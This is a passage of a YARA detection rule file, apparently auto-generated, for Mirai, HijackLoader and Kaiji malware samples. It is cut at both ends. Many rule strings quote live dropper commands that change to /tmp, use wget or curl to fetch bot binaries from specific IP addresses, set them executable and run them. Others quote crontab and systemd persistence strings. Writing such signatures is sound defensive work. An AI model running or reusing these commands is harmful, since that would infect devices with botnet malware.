      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "09dad71f77345bbf22959660250a830c78478a42e65cd87cccfc39700a0ea2d5"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://83.147.18.125/00101010101001011010101110101010110101011101010" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 20KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__09deb8e1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_09deb8e1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "09deb8e173ac1e46564968aa656b83723d4456fd7599182e185c8f376fd8711f"
   strings:
      $x1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.arm; curl -O http://196.251.117.15" ascii /* score: '33.00'*/
      $x2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.ppc; curl -O http://196.251.117.15" ascii /* score: '33.00'*/
      $x3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.arc; curl -O http://196.251.117.15" ascii /* score: '33.00'*/
      $x4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.spc; curl -O http://196.251.117.15" ascii /* score: '33.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.i468; curl -O http://196.251.117.1" ascii /* score: '30.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.i686; curl -O http://196.251.117.1" ascii /* score: '30.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.x86_64; curl -O http://196.251.117" ascii /* score: '30.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.arm6; curl -O http://196.251.117.1" ascii /* score: '30.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.spc; curl -O http://196.251.117.15" ascii /* score: '30.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.m68k; curl -O http://196.251.117.1" ascii /* score: '30.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.arm7; curl -O http://196.251.117.1" ascii /* score: '30.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.mips; curl -O http://196.251.117.1" ascii /* score: '30.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.mpsl; curl -O http://196.251.117.1" ascii /* score: '30.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.x86; curl -O http://196.251.117.15" ascii /* score: '30.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.117.150/bins/morte.ppc; curl -O http://196.251.117.15" ascii /* score: '30.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 9KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__1395daa1 {
   meta:
      description = "_subset_batch - file Mirai(signature)_1395daa1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1395daa1b61cf34893e84192844b1d580697b65889c6a0ec1f3364dc50954395"
   strings:
      $s1 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.spc; curl -O http://103.181" ascii /* score: '30.00'*/
      $s2 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.arc; curl -O http://103.181" ascii /* score: '30.00'*/
      $s3 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.arm; curl -O http://103.181" ascii /* score: '30.00'*/
      $s4 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.ppc; curl -O http://103.181" ascii /* score: '30.00'*/
      $s5 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.ppc; curl -O http://103.181" ascii /* score: '29.00'*/
      $s6 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.arc; curl -O http://103.181" ascii /* score: '29.00'*/
      $s7 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.arm; curl -O http://103.181" ascii /* score: '29.00'*/
      $s8 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.spc; curl -O http://103.181" ascii /* score: '29.00'*/
      $s9 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.m68k; curl -O http://103.18" ascii /* score: '27.00'*/
      $s10 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.sh4; curl -O http://103.181" ascii /* score: '27.00'*/
      $s11 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.mpsl; curl -O http://103.18" ascii /* score: '27.00'*/
      $s12 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.x86; curl -O http://103.181" ascii /* score: '27.00'*/
      $s13 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.arm7; curl -O http://103.18" ascii /* score: '27.00'*/
      $s14 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.arm6; curl -O http://103.18" ascii /* score: '27.00'*/
      $s15 = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.181.182.245/hiddenbin/boatnet.arm5; curl -O http://103.18" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x2123 and filesize < 8KB and
      8 of them
}

rule Mirai_signature__3 {
   meta:
      description = "_subset_batch - file Mirai(signature).unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7da818ca54e89a38799abdcc676d2826eb4dc859320cab85ce028fac072b2ce1"
   strings:
      $s1 = "cd /tmp; rm -rf mpsl; wget http://178.16.54.225/mpsl;chmod 777 mpsl;./mpsl fhttpd.mpsl" fullword ascii /* score: '27.00'*/
      $s2 = "cd /tmp; rm -rf mips; wget http://178.16.54.225/mips;chmod 777 mips;./mips fhttpd.mips" fullword ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 1KB and
      all of them
}

rule Mirai_signature__06351f8b {
   meta:
      description = "_subset_batch - file Mirai(signature)_06351f8b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "06351f8b9630ef73c1e9d3081e536590a9782dc8d4086fc7e04ed1744bf1f237"
   strings:
      $s1 = "GET /geoip/?res=20&r HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s2 = "Host: 1.1.1.1" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__06ffed2d {
   meta:
      description = "_subset_batch - file Mirai(signature)_06ffed2d.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "06ffed2db83aa5ee858ccd6f830df54758de89568b90c2a243c7e7c8bd5ae719"
   strings:
      $s1 = "GET /geoip/?res=20&r HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s2 = "Host: 1.1.1.1" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__0d4373ad {
   meta:
      description = "_subset_batch - file Mirai(signature)_0d4373ad.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0d4373adfe4317458ba1d1ea0a983d5ed1e29b70dd2d2d91518993c5220a5ceb"
   strings:
      $s1 = "GET /geoip/?res=20&r HTTP/1.1" fullword ascii /* score: '16.00'*/
      $s2 = "Host: 1.1.1.1" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      all of them
}

rule Mirai_signature__0450636a {
   meta:
      description = "_subset_batch - file Mirai(signature)_0450636a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0450636ac035776d6da960776ef47413e3ebbb0105d4c797e7f990f365c720eb"
   strings:
      $s1 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s3 = "netstat" fullword ascii /* score: '8.00'*/
      $s4 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s5 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__1b8c6487 {
   meta:
      description = "_subset_batch - file Mirai(signature)_1b8c6487.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1b8c6487a37f507e54241cc60111ef4c03955448b44d18d4d0c776617419ad7a"
   strings:
      $s1 = "/proc/%s/cmdline" fullword ascii /* score: '15.00'*/
      $s2 = "__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s3 = "netstat" fullword ascii /* score: '8.00'*/
      $s4 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
      $s5 = "udevadm" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 500KB and
      all of them
}

rule Mirai_signature__01182536 {
   meta:
      description = "_subset_batch - file Mirai(signature)_01182536.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "01182536d81bbc330514147b5c98a147a1c6f000e732a759527c4ff8c305c148"
   strings:
      $s1 = "D/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x3" ascii /* score: '8.00'*/
      $s2 = "A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
      $s3 = "3/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9" ascii /* score: '8.00'*/
      $s4 = "/x99/x99/x99/x99/x22/x22/x66/x19/x01/x02/x03/x04/x05/x06/x07/x08/x09/x10/x11/x12/x13/x14/x15/x16/x17/xFU/xZK//x38/xFJ/x93/xID/x9" ascii /* score: '8.00'*/
      $s5 = "8/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x9" ascii /* score: '8.00'*/
      $s6 = "J/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xI" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__1a0fa34c {
   meta:
      description = "_subset_batch - file Mirai(signature)_1a0fa34c.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1a0fa34c2c315504ea4d71e257608bab2b7591601e37511bb04bf8f4ca1c11cc"
   strings:
      $s1 = "WantedBy=multi-user.target" fullword ascii /* score: '17.00'*/
      $s2 = "/tmp/rc.local.tmp" fullword ascii /* score: '13.00'*/
      $s3 = "getchal" fullword ascii /* score: '13.00'*/
      $s4 = "__get_myaddress: socket" fullword ascii /* score: '12.00'*/
      $s5 = "(crontab -l 2>/dev/null; echo \"" fullword ascii /* score: '12.00'*/
      $s6 = "\") | crontab - >/dev/null 2>&1" fullword ascii /* score: '12.00'*/
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0" fullword ascii /* score: '9.00'*/
      $s8 = "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0" fullword ascii /* score: '9.00'*/
      $s9 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s11 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0" fullword ascii /* score: '9.00'*/
      $s12 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" fullword ascii /* score: '9.00'*/
      $s13 = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1" fullword ascii /* score: '9.00'*/
      $s14 = "systemctl enable " fullword ascii /* score: '9.00'*/
      $s15 = "systemctl start " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 600KB and
      8 of them
}

rule Mirai_signature__00d23a8f {
   meta:
      description = "_subset_batch - file Mirai(signature)_00d23a8f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "00d23a8fa51d5c2eca7d1923b1262b27a286db33fc1443b76ebe4893c8590b96"
   strings:
      $s1 = "/usr/sbid -D" fullword ascii /* score: '8.00'*/
      $s2 = "webserv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0a180708 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0a180708.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0a180708d5422b9ab73868c272f547691612a4eb35c9e4792a92c107fe0cea4b"
   strings:
      $s1 = "D/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x3" ascii /* score: '8.00'*/
      $s2 = "A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xF" ascii /* score: '8.00'*/
      $s3 = "3/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9" ascii /* score: '8.00'*/
      $s4 = "/x99/x99/x99/x99/x22/x22/x66/x19/x01/x02/x03/x04/x05/x06/x07/x08/x09/x10/x11/x12/x13/x14/x15/x16/x17/xFU/xZK//x38/xFJ/x93/xID/x9" ascii /* score: '8.00'*/
      $s5 = "8/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x9" ascii /* score: '8.00'*/
      $s6 = "J/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xI" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0a86690b {
   meta:
      description = "_subset_batch - file Mirai(signature)_0a86690b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0a86690b2d2d7196fa640e061781d0dacc49620945443cd3053f3b9b21556a1a"
   strings:
      $x1 = "[LOCKSH] KILLING shell process PID %s (Parent PID: %d, cmdline: %s)" fullword ascii /* score: '33.50'*/
      $s2 = "[LOCKSH] SKIPPING SSH process PID %s (Parent PID: %d)" fullword ascii /* score: '21.00'*/
      $s3 = "[CLEAN] KILLING PID %d (failed real path check)" fullword ascii /* score: '10.00'*/
      $s4 = "[CLEAN] SKIPPING SSH daemon PID %d at %s" fullword ascii /* score: '10.00'*/
      $s5 = "someoffdeeznuts" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Mirai_signature__0508141f {
   meta:
      description = "_subset_batch - file Mirai(signature)_0508141f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0508141f3a8d79bb12af2400c554a110ec3e785ca98682fa702d406435dd8e64"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s3 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s4 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s5 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s6 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s7 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s8 = "cvkqpav" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__08cdec00 {
   meta:
      description = "_subset_batch - file Mirai(signature)_08cdec00.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "08cdec0079c0a96f4b1b760a91531cdf2d9cd79acf310eedb3af639911bde347"
   strings:
      $s1 = "POST /cdn-cgi/" fullword ascii /* score: '13.00'*/
      $s2 = "tvmrepa" fullword ascii /* score: '8.00'*/
      $s3 = "jbhagpmkj" fullword ascii /* score: '8.00'*/
      $s4 = "jgkvvagp" fullword ascii /* score: '8.00'*/
      $s5 = "pwckmjckj" fullword ascii /* score: '8.00'*/
      $s6 = "nqejpagl" fullword ascii /* score: '8.00'*/
      $s7 = "vaehpao" fullword ascii /* score: '8.00'*/
      $s8 = "cvkqpav" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule Mirai_signature__0df541d7 {
   meta:
      description = "_subset_batch - file Mirai(signature)_0df541d7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "0df541d7393b89b4eb13493fd351e7ba7aeb7ca522a5676a00e5b21b8af1d87d"
   strings:
      $s1 = ":xsvr@M-SEARCH * " fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 60KB and
      all of them
}

rule Mirai_signature__1230d72e {
   meta:
      description = "_subset_batch - file Mirai(signature)_1230d72e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1230d72ed4b011c73c3672b7edeab0cb62d66372126cdf2386e2776c1dd71531"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__130ffe46 {
   meta:
      description = "_subset_batch - file Mirai(signature)_130ffe46.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "130ffe46eb604ea52d39b1def2e4660adaa0112ee351bb47ccde41c580e7058d"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__17d66b00 {
   meta:
      description = "_subset_batch - file Mirai(signature)_17d66b00.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "17d66b0058bce154bff6670fa733f784028c550b268b73e39f194a431c627608"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__16131e97 {
   meta:
      description = "_subset_batch - file Mirai(signature)_16131e97.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "16131e975b3dd2efa291d7a1faac924fc5404bee9ab0003229c199a31cc1cffd"
   strings:
      $s1 = "(!PROT_EXEC|PROT_WRITE failed." fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 100KB and
      all of them
}

rule Mirai_signature__1a42ca05 {
   meta:
      description = "_subset_batch - file Mirai(signature)_1a42ca05.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1a42ca056848a4b675a51dd084987c0e635b0db79f30c9e98a4c6cd7b93d9f8b"
   strings:
      $s1 = "                <value>rm x86; curl --output x86 http://141.98.10.37/x86; wget http://141.98.10.37/x86; chmod 777 x86; ./x86 x86" ascii /* score: '19.00'*/
      $s2 = "                <value>rm x86; curl --output x86 http://141.98.10.37/x86; wget http://141.98.10.37/x86; chmod 777 x86; ./x86 x86" ascii /* score: '19.00'*/
      $s3 = "<beans xmlns=\"http://www.springframework.org/schema/beans\"" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x623c and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _HijackLoader_signature__7c46cd3e_HijackLoader_signature__cde145f8094b2dd2b805036a4ba9eb72_imphash__0 {
   meta:
      description = "_subset_batch - from files HijackLoader(signature)_7c46cd3e.zip, HijackLoader(signature)_cde145f8094b2dd2b805036a4ba9eb72(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7c46cd3e7e1aecc9f69273c4e9cd85b0bdc22fad037e318aab9e77da5a0e3641"
      hash2 = "b5b2a1ef5d907e11cc7e0ff767045fa59423a35aa62897df233b824a1c3e8113"
   strings:
      $s1 = "  - a text string encoded using the specified encoding" fullword ascii /* score: '24.00'*/
      $s2 = "dumps() -- write valu" fullword ascii /* score: '22.00'*/
      $s3 = "C:\\build27\\cpython\\PCBuild\\python27.pdb" fullword ascii /* score: '20.00'*/
      $s4 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s5 = "      <assemblyIdentity type=\"win32\" name=\"Microsoft.VC90.CRT\" version=\"9.0.21022.8\" processorArchitecture=\"x86\" publicK" ascii /* score: '18.00'*/
      $s6 = "55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555" ascii /* score: '17.00'*/ /* hex encoded string 'UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU' */
      $s7 = "Non-ASCII character '\\x%.2x' in file %.200s on line %i, but no encoding declared; see http://python.org/dev/peps/pep-0263/ for " ascii /* score: '15.50'*/
      $s8 = "  REG_RESOURCE_LIST -- A device-driver resource list." fullword ascii /* score: '15.00'*/
      $s9 = "               when the system is executing on behalf of the process." fullword ascii /* score: '15.00'*/
      $s10 = "  REG_BINARY -- Binary data in any form." fullword ascii /* score: '15.00'*/
      $s11 = "  if self.default_factory is None: raise KeyError((key,))" fullword ascii /* score: '15.00'*/
      $s12 = "value,type_id = QueryValueEx(key, value_name) - Retrieves the type and data for a specified value name associated with an open r" ascii /* score: '15.00'*/
      $s13 = "Delete field \"targets\" changed size during iteration" fullword ascii /* score: '14.00'*/
      $s14 = "Assign field \"targets\" changed size during iteration" fullword ascii /* score: '14.00'*/
      $s15 = "QPRWSV" fullword ascii /* reversed goodware string 'VSWRPQ' */ /* score: '13.50'*/
   condition:
      ( ( uint16(0) == 0x4b50 or uint16(0) == 0x5a4d ) and filesize < 20000KB and pe.imphash() == "cde145f8094b2dd2b805036a4ba9eb72" and ( 8 of them )
      ) or ( all of them )
}

rule _Kaiji_signature__Kaiji_signature__78e6c917_Kaiji_signature__7cab2814_Kaiji_signature__8895157c_Kaiji_signature__a82036bb_Ka_1 {
   meta:
      description = "_subset_batch - from files Kaiji(signature).elf, Kaiji(signature)_78e6c917.elf, Kaiji(signature)_7cab2814.elf, Kaiji(signature)_8895157c.elf, Kaiji(signature)_a82036bb.elf, Kaiji(signature)_af3c1821.elf, Kaiji(signature)_bd7a37a8.elf, Kaiji(signature)_c6c0da6a.elf, Kaiji(signature)_ded5e440.elf, Kaiji(signature)_eec9b44f.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aead4ac6bea6859316dce9aeda0d704e05293466dde897247c7c32cb32c6a4e1"
      hash2 = "78e6c917b26061148d6a1f589521c9a91cb3c35d7263b046bbbfb08e7ad43c34"
      hash3 = "7cab2814a06c64a3cacd86d90222f469c67a4c9ff927c8fc0b262f8a667b2992"
      hash4 = "8895157c86f0f62ccc96c12ca064bb7cc1d311cbe94467fbe9895f3aa74b5f43"
      hash5 = "a82036bbe31274fd6c010f76f210d3c81dfbc47eb36843a9ce5e5ea50a6cd29f"
      hash6 = "af3c182144f6ec184bbae0429ffe5d29767cd82cec0410faf6fa3068b4551afb"
      hash7 = "bd7a37a86a1fa6831f426d1570f702aaffe454b4609eda5f111b7bd0f4d6da81"
      hash8 = "c6c0da6a5a6c95627c240816ab46ccf88b5e661c59827c33e9af6ef4080855d8"
      hash9 = "ded5e44044fbffebe6a1beb9d66f8c9282cbf7cef065d8231244997f0829a84e"
      hash10 = "eec9b44f6de1f6157457edc8da37f9813a75b3176c61f89b7aa78dcdf7890892"
   strings:
      $x1 = "adding nil Certificate to CertPoolchacha20: wrong HChaCha20 key sizecrypto/aes: invalid buffer overlapcrypto/des: invalid buffer" ascii /* score: '59.50'*/
      $x2 = "runtime: text offset base pointer out of rangeruntime: type offset base pointer out of rangeslice bounds out of range [:%x] with" ascii /* score: '57.00'*/
      $x3 = "http: RoundTripper implementation (%T) returned a nil *Response with a nil errorx509: invalid signature: parent certificate cann" ascii /* score: '50.50'*/
      $x4 = "/usr/lib/libgdi.so.0.8.1_cgo_thread_start missingallgadd: bad status Gidlearena already initializedbad status in shrinkstackbad " ascii /* score: '44.50'*/
      $x5 = "span set block with unpopped elements found in resettls: received a session ticket with invalid lifetimetls: server selected uns" ascii /* score: '43.50'*/
      $x6 = "0123456789abcdefghijklmnopqrstuvwxyz444089209850062616169452667236328125Go pointer stored into non-Go memoryIA5String contains i" ascii /* score: '43.00'*/
